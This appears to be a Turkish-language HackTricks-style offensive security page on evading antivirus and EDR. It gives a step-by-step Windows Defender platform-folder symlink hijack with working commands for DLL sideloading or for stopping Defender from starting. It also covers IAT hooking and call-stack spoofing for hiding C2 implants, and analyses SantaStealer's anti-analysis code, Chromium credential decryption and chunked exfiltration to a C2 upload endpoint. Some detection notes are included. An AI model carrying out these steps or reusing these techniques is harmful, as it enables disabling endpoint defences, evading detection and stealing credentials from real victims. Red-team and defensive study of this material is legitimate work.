## Platform Version Folder Symlink Hijack ile Microsoft Defender'ı manipüle etme

Windows Defender, çalıştığı platformu şu alt klasörleri listeleyerek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Leksikografik olarak en yüksek versiyon string'ine (ör. `4.18.25070.5-0`) sahip alt klasörü seçer ve Defender hizmet süreçlerini oradan başlatır (hizmet/registry yollarını buna göre günceller). Bu seçim dizin girişlerine, reparse point'ler (symlinks) dahil, güvenir. Bir yönetici bunu Defender'ı saldırgan tarafından yazılabilir bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi gerçekleştirmek için kullanabilir.

Önkoşullar
- Yerel Administrator (Platform klasörü altında dizinler/symlink'ler oluşturmak için gerekli)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme yeteneği (önyüklemede hizmet yeniden başlatma)
- Sadece yerleşik araçlar gerekli (mklink)

Neden işe yarıyor
- Defender kendi klasörlerine yazmaları engeller, ancak platform seçimi dizin girişlerine güvenir ve hedefin korumalı/güvenilir bir yola çözüldüğünü doğrulamadan leksikografik olarak en yüksek versiyonu seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir klonunu hazırlayın, örn. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde kendi klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilmiş yol üzerinden çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve bu konumu yansıtan servis yapılandırmasını/kayıt defterini gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLL'leri Drop/replace ederek Defender süreçlerinde code execution gerçekleştirin. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözülmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını unutmayın; admin hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion'ı C2 implant'tan hedef modülün kendisine taşıyabilir; bunun için modülün Import Address Table (IAT)ını hook'layıp seçili API'leri saldırgan kontrollü, position‑independent code (PIC) üzerinden yönlendirir. Bu, birçok kitin açığa çıkardığı küçük API yüzeyinin ötesine kaçınmayı genelleştirir (ör. CreateProcessA) ve aynı korumaları BOFs ve post‑exploitation DLLs için de genişletir.

High-level approach
- Reflective loader (prepended or companion) kullanarak hedef modülün yanına bir PIC blob'u stage edin. PIC self‑contained ve position‑independent olmalıdır.
- Host DLL yüklenirken, IMAGE_IMPORT_DESCRIPTOR içinde dolaşıp hedeflenen importlar için IAT girdilerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper'lara işaret edecek şekilde patch edin.
- Her PIC wrapper, gerçek API adresine tail‑calling yapmadan önce evasions uygular. Tipik evasions şunlardır:
  - Çağrı etrafında bellek mask/unmask (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa isim/izinlerini değiştirme) sonra çağrı sonrası eski hale geri döndürme.
  - Call‑stack spoofing: zararsız bir stack oluşturup hedef API'ye geçiş yaparak call‑stack analizinin beklenen frame'leri çözmesini sağlamak.
- Uyumluluk için bir arayüz export edin, böylece bir Aggressor script (veya eşdeğeri) Beacon, BOFs ve post‑ex DLLs için hangi API'lerin hook'lanacağını kaydedebilir.

Why IAT hooking here
- Hook'lanan importu kullanan herhangi bir kod için çalışır; araç kodunu değiştirmeye veya belirli API'leri proxy'lemek için Beacon'a güvenmeye gerek yoktur.
- Post‑ex DLLs'i kapsar: LoadLibrary*'ı hook'lamak modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve aynı maskelme/stack evasion'u onların API çağrılarına uygulamanıza izin verir.
- CreateProcessA/W'i sarmalayarak call‑stack–tabanlı tespitlere karşı process‑spawning post‑ex komutlarının güvenilir kullanımını geri getirir.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yaması relocations/ASLR işleminden sonra ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi reflective loader'lar, yüklenen modülün DllMain'inde hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi yama yapmadan önce yakaladığınız orijinal IAT değeri veya LdrGetProcedureAddress aracılığıyla çözün.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call‑stack spoofing stub
- Draugr‑style PIC stub'ları sahte bir çağrı zinciri (iyi huylu modüllere dönüş adresleri) oluşturur ve ardından gerçek API'ye pivot yapar.
- Bu, Beacon/BOFs'den hassas API'lere giden kanonik yığınlar bekleyen tespitleri bozar.
- API prologundan önce beklenen çerçevelerin içine ulaşmak için stack cutting/stack stitching teknikleri ile eşleştirin.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader'ı post‑ex DLL'lerin başına ekleyin.
- Hedef API'leri kaydetmek için bir Aggressor scripti kullanın; böylece Beacon ve BOFs kod değişikliği olmadan aynı kaçınma yolundan şeffaf şekilde faydalanır.

Tespit/DFIR hususları
- IAT bütünlüğü: non‑image (heap/anon) adreslerine çözümlenen girdiler; import pointer'larının periyodik doğrulanması.
- Yığın anomalileri: yüklü imgelere ait olmayan dönüş adresleri; non‑image PIC'e ani geçişler; tutarsız RtlUserThreadStart ata zinciri.
- Loader telemetriği: işlem içi IAT yazmaları, import thunk'larını değiştiren erken DllMain etkinlikleri, yüklemede oluşturulan beklenmeyen RX bölgeleri.
- Image‑load kaçınması: LoadLibrary* hook'lanıyorsa, memory masking olayları ile korele şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT yamalaması yapan reflective loader'lar (örn., TitanLdr, AceLdr)
- Memory masking hook'ları (örn., simplehook) ve stack‑cutting PIC (stackcutting)
- PIC çağrı-yığını taklit stub'ları (örn., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) modern info‑stealer'ların AV bypass, anti‑analysis ve credential access'i tek bir iş akışında nasıl harmanladığını gösterir.

### Keyboard layout gating & sandbox delay

- Bir konfig bayrağı (`anti_cis`) `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Eğer bir Kiril düzeni bulunursa, örnek boş bir `CIS` işareti bırakır ve stealer'ları çalıştırmadan önce sonlanır; böylece hariç tutulan yerel ayarlarda asla tetiklenmemesini sağlarken tehdit avcıları için bir artefakt bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A işlem listesini tarar, her adı özel bir rolling checksum ile hash'ler ve bunu gömülü blocklist'lerle (debuggers/sandboxes) karşılaştırır; checksum'u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini inceler (işlem sayısı alt sınırı, son uptime), VirtualBox eklerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping tespiti için uyku çevresinde zamanlama kontrolleri uygular. Herhangi bir eşleşme modüller başlatılmadan önce abort ettirir.

### Fileless helper + double ChaCha20 reflective loading

- Ana DLL/EXE, ya diske atılan ya da belleğe manuel map edilen bir Chromium credential helper'ı gömer; fileless mod imports/relocations'ı kendisi çözdüğü için hiçbir helper artifaktı yazılmaz.
- Bu helper, ikinci aşama bir DLL'i ChaCha20 ile iki kez şifrelenmiş şekilde saklar (iki 32-byte anahtar + 12-byte nonce). Her iki geçişten sonra blob'u reflektif olarak yükler (no `LoadLibrary`) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exportlarını çağırır.
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına injekte etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption anahtarlarını devralır ve ABE sertleştirmesine rağmen parolaları/cookie'leri/kredi kartlarını doğrudan SQLite veritabanlarından şifre çözer.

### Modüler bellek içi toplama & parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu iter'e eder ve etkin modül başına bir thread spawn eder (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri, vb.). Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık ~45s'lik join penceresinden sonra dosya sayısını raporlar.
- İşlem tamamlandığında, her şey statically linked `miniz` kütüphanesi ile `%TEMP%\\Log.zip` olarak ziplenir. `ThreadPayload1` sonra 15s uyur ve arşivi HTTP POST ile 10 MB parçalar halinde `http://<C2>:6767/upload` adresine stream eder, bir browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) taklit ederek. Her parça `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` ekler ve son parça `complete: true` ekleyerek C2'nin yeniden birleştirmenin tamamlandığını bilmesini sağlar.

## Referanslar

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
